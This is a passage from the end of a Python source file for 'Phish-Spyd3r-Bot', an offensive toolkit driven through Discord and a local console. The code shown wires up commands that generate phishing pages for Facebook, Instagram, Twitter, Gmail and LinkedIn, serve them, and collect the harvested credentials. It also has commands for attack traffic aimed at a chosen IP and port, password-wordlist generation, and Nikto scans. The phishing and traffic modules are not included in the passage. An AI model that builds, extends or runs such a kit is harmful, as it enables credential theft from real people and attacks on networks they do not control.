                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='nikto_full')
        async def nikto_full_cmd(ctx, target: str):
            await ctx.send(f"🕷️ Full scan on {target}... This may take several minutes")
            result = self.handler.execute(f"nikto_full {target}", "discord")
            if result['success']:
                data = result['data']
                vulns = data.get('vulnerabilities', [])
                await ctx.send(f"✅ Found {len(vulns)} vulnerabilities")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        # ==================== Basic Network Commands ====================
        @self.bot.command(name='ping')
        async def ping_cmd(ctx, target: str):
            await ctx.send(f"🏓 Pinging {target}...")
            result = self.handler.execute(f"ping {target}", "discord")
            output = result.get('output', '')[:500]
            await ctx.send(f"```{output}```")
        
        @self.bot.command(name='scan')
        async def scan_cmd(ctx, target: str):
            await ctx.send(f"🔍 Scanning {target}...")
            result = self.handler.execute(f"scan {target}", "discord")
            output = result.get('output', '')[:1000]
            await ctx.send(f"```{output}```")
        
        @self.bot.command(name='traceroute')
        async def traceroute_cmd(ctx, target: str):
            await ctx.send(f"🛣️ Tracing route to {target}...")
            result = self.handler.execute(f"traceroute {target}", "discord")
            output = result.get('output', '')[:1000]
            await ctx.send(f"```{output}```")
        
        @self.bot.command(name='whois')
        async def whois_cmd(ctx, domain: str):
            await ctx.send(f"🔎 WHOIS lookup for {domain}...")
            result = self.handler.execute(f"whois {domain}", "discord")
            output = result.get('output', '')[:1000]
            await ctx.send(f"```{output}```")
        
        @self.bot.command(name='dns')
        async def dns_cmd(ctx, domain: str):
            await ctx.send(f"📡 DNS lookup for {domain}...")
            result = self.handler.execute(f"dns {domain}", "discord")
            output = result.get('output', '')[:500]
            await ctx.send(f"```{output}```")
        
        @self.bot.command(name='location')
        async def location_cmd(ctx, ip: str):
            result = self.handler.execute(f"location {ip}", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"📍 {ip}: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='system')
        async def system_cmd(ctx):
            result = self.handler.execute("system", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"💻 {data.get('hostname')} | CPU: {data.get('cpu')}% | RAM: {data.get('memory')}%")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='threats')
        async def threats_cmd(ctx, limit: int = 5):
            result = self.handler.execute(f"threats {limit}", "discord")
            if result['success']:
                threats = result['data']
                if threats:
                    msg = "🚨 Recent Threats:\n"
                    for t in threats:
                        msg += f"• {t.get('threat_type')} from {t.get('source_ip')} [{t.get('severity')}]\n"
                    await ctx.send(msg[:1900])
                else:
                    await ctx.send("✅ No recent threats")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='report')
        async def report_cmd(ctx):
            result = self.handler.execute("report", "discord")
            if result['success']:
                stats = result['data']
                await ctx.send(f"📊 Stats: {stats.get('total_commands', 0)} commands, {stats.get('total_threats', 0)} threats, {stats.get('total_blocked_ips', 0)} blocked IPs")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        # ==================== Help Command ====================
        @self.bot.command(name='help')
        async def help_cmd(ctx):
            embed = discord.Embed(title="🐟 Phish-Spyd3r-Bot Commands", color=0x0066cc)
            embed.add_field(name="⏰ Time", value="`!time`, `!date`, `!datetime`, `!history`", inline=False)
            embed.add_field(name="🌐 curl/wget", value="`!curl <url> [GET/POST] [data]`\n`!wget <url> [filename]`", inline=False)
            embed.add_field(name="🚀 Traffic", value="`!traffic <type> <ip> <duration> [port]`\n`!traffic_types`\n`!traffic_stop`", inline=False)
            embed.add_field(name="🔐 Crunch", value="`!crunch <min> <max> [charset]`\n`!crunch_help`", inline=False)
            embed.add_field(name="🎣 Phishing", value="`!phish_facebook`, `!phish_instagram`, `!phish_twitter`, `!phish_gmail`, `!phish_linkedin`\n`!phish_start <id> [port]`, `!phish_stop`, `!phish_status`\n`!phish_creds [id]`, `!phish_qr <id>`, `!phish_shorten <id>`", inline=False)
            embed.add_field(name="🕷️ Nikto", value="`!nikto <target>`, `!nikto_full <target>`", inline=False)
            embed.add_field(name="🔒 IP Mgmt", value="`!add_ip <ip>`, `!remove_ip <ip>`, `!block_ip <ip>`, `!unblock_ip <ip>`, `!list_ips`", inline=False)
            embed.add_field(name="🔍 Network", value="`!ping <target>`, `!scan <target>`, `!traceroute <target>`, `!whois <domain>`, `!dns <domain>`, `!location <ip>`", inline=False)
            embed.add_field(name="📊 System", value="`!system`, `!threats`, `!report`", inline=False)
            embed.set_footer(text="Phish-Spyd3r-Bot v10.1.0 | Blue Theme")
            await ctx.send(embed=embed)
    
    async def check_permissions(self, ctx) -> bool:
        """Check if user has permission"""
        if ctx.author.guild_permissions.administrator:
            return True
        admin_role = self.config.get('admin_role', 'Admin')
        security_role = self.config.get('security_role', 'Security Team')
        user_roles = [role.name for role in ctx.author.roles]
        if admin_role in user_roles or security_role in user_roles:
            return True
        await ctx.send(f"❌ Requires {admin_role} or {security_role} role")
        return False
    
    def start_bot_thread(self):
        """Start Discord bot in separate thread"""
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_discord_bot(self):
        """Run Discord bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# MAIN APPLICATION
# =====================
class PhishSpyd3rBot:
    """Main application class with blue theme"""
    
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.nikto = NiktoScanner(self.db, self.config.get('nikto', {}))
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.crunch = CrunchGenerator(self.db, self.config)
        self.handler = CommandHandler(self.db, self.nikto, self.traffic_gen, self.crunch)
        self.monitor = NetworkMonitor(self.db, self.config)
        self.discord_bot = PhishSpyd3rDiscord(self.handler, self.db, self.monitor)
        self.session_id = self.db.create_session("local_user")
        self.running = True
    
    def print_banner(self):
        """Print blue-themed banner"""
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════╗
║{Colors.SECONDARY}        🐟 PHISH-SPYD3R-BOT v0.0.1    🐟                     {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}  • 1000+ Commands        • curl/wget via Discord     {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🚀 Real Traffic        • 🎣 Phishing Suite         {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🔐 Crunch Wordlists    • ⏰ Time/Date Commands     {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🕷️ Nikto Scanner       • 🔒 IP Management         {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
{Colors.LIGHT_BLUE}Type 'help' for commands, '!help' for Discord help{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        """Print blue-themed help"""
        help_text = f"""
{Colors.PRIMARY}┌───────────────── PHISH-SPYD3R-BOT COMMANDS ─────────────────┐{Colors.RESET}

{Colors.SECONDARY}⏰ TIME & DATE:{Colors.RESET}
  time, date, datetime, history, time_history, timezone

{Colors.SECONDARY}🌐 CURL/WGET:{Colors.RESET}
  curl <url> [method] [data]  - HTTP requests
  wget <url> [output]         - Download files

{Colors.SECONDARY}🚀 TRAFFIC GENERATION:{Colors.RESET}
  generate_traffic <type> <ip> <duration> [port]
  traffic_types, traffic_status, traffic_stop [id], traffic_logs

{Colors.SECONDARY}🔐 CRUNCH WORDLIST:{Colors.RESET}
  crunch <min> <max> [charset] - Generate wordlist
  crunch_help, crunch_status, crunch_stop, crunch_history, crunch_charsets

{Colors.SECONDARY}🎣 PHISHING:{Colors.RESET}
  generate_phishing_link_for_facebook, instagram, twitter, gmail, linkedin
  generate_phishing_link_for_custom [url]
  phishing_start_server <id> [port], phishing_stop_server, phishing_status
  phishing_links, phishing_credentials [id], phishing_qr <id>, phishing_shorten <id>

{Colors.SECONDARY}🕷️ NIKTO SCANNER:{Colors.RESET}
  nikto <target>, nikto_full, nikto_ssl, nikto_sql, nikto_xss, nikto_cgi
  nikto_status, nikto_results

{Colors.SECONDARY}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes], remove_ip <ip>, block_ip <ip> [reason]
  unblock_ip <ip>, list_ips [all/active/blocked], ip_info <ip>

{Colors.SECONDARY}🔍 NETWORK TOOLS:{Colors.RESET}
  ping <target>, scan <target>, traceroute <target>, whois <domain>
  dig/dns <domain>, location <ip>, analyze <ip>

{Colors.SECONDARY}📊 SYSTEM:{Colors.RESET}
  system, network, status, threats [limit], report

{Colors.PRIMARY}└─────────────────────────────────────────────────────────────┘{Colors.RESET}
        """
        print(help_text)
    
    def check_dependencies(self):
        """Check dependencies"""
        print(f"{Colors.SECONDARY}🔍 Checking dependencies...{Colors.RESET}")
        tools = ['ping', 'nmap', 'curl', 'wget', 'dig', 'traceroute', 'nikto', 'crunch']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        print()
    
    def process_command(self, command: str):
        """Process user command"""
        if not command.strip():
            return
        
        self.db.update_session_activity(self.session_id)
        parts = command.strip().split()
        cmd = parts[0].lower()
        
        if cmd == 'help':
            self.print_help()
        elif cmd == 'start':
            self.monitor.start_monitoring()
        elif cmd == 'stop':
            self.monitor.stop_monitoring()
        elif cmd == 'status':
            status = self.monitor.get_status()
            sessions = self.db.get_sessions()
            print(f"{Colors.PRIMARY}📊 Status:{Colors.RESET}")
            print(f"  Session: {self.session_id}")
            print(f"  Active Sessions: {len(sessions)}")
            print(f"  Monitoring: {'✅' if status['monitoring'] else '❌'}")
            print(f"  Monitored IPs: {status['monitored_ips_count']}")
            print(f"  Blocked IPs: {status['blocked_ips']}")
            print(f"  Discord: {'✅' if self.discord_bot.running else '❌'}")
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        elif cmd == 'exit':
            self.running = False
            print(f"{Colors.SUCCESS}👋 Goodbye!{Colors.RESET}")
        else:
            result = self.handler.execute(command)
            if result['success']:
                output = result.get('output', '') or result.get('data', '')
                if isinstance(output, dict):
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                print(f"{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def setup_discord(self):
        """Setup Discord bot"""
        print(f"{Colors.PRIMARY}🤖 Discord Bot Setup{Colors.RESET}")
        token = input(f"{Colors.SECONDARY}Enter bot token: {Colors.RESET}").strip()
        if not token:
            return
        prefix = input(f"{Colors.SECONDARY}Command prefix (default: !): {Colors.RESET}").strip() or "!"
        if self.discord_bot.save_config(token, "", True, prefix):
            print(f"{Colors.SUCCESS}✅ Discord configured! Starting bot...{Colors.RESET}")
            self.discord_bot.start_bot_thread()
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        # Setup Discord if configured
        if self.discord_bot.config.get('enabled') and self.discord_bot.config.get('token'):
            self.discord_bot.start_bot_thread()
            print(f"{Colors.SUCCESS}✅ Discord bot started{Colors.RESET}")
        else:
            setup = input(f"{Colors.SECONDARY}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                self.setup_discord()
        
        # Start monitoring
        auto_monitor = input(f"{Colors.SECONDARY}Start monitoring? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.monitor.start_monitoring()
        
        print(f"{Colors.SUCCESS}✅ Ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.ACCENT}Type 'help' for commands{Colors.RESET}")
        
        # Main loop
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{self.session_id}]{Colors.RESET} "
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
        
        # Cleanup
        self.monitor.stop_monitoring()
        self.traffic_gen.stop_generation()
        self.crunch.stop_generation()
        if hasattr(self.handler.social_tools, 'phishing_server') and self.handler.social_tools.phishing_server.running:
            self.handler.social_tools.stop_phishing_server()
        self.db.end_session(self.session_id)
        self.db.close()
        print(f"{Colors.SUCCESS}✅ Shutdown complete{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.SECONDARY}🐟 Starting Phish-Spyd3r-Bot...{Colors.RESET}")
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        app = PhishSpyd3rBot()
        app.run()
    except Exception as e:
        print(f"{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()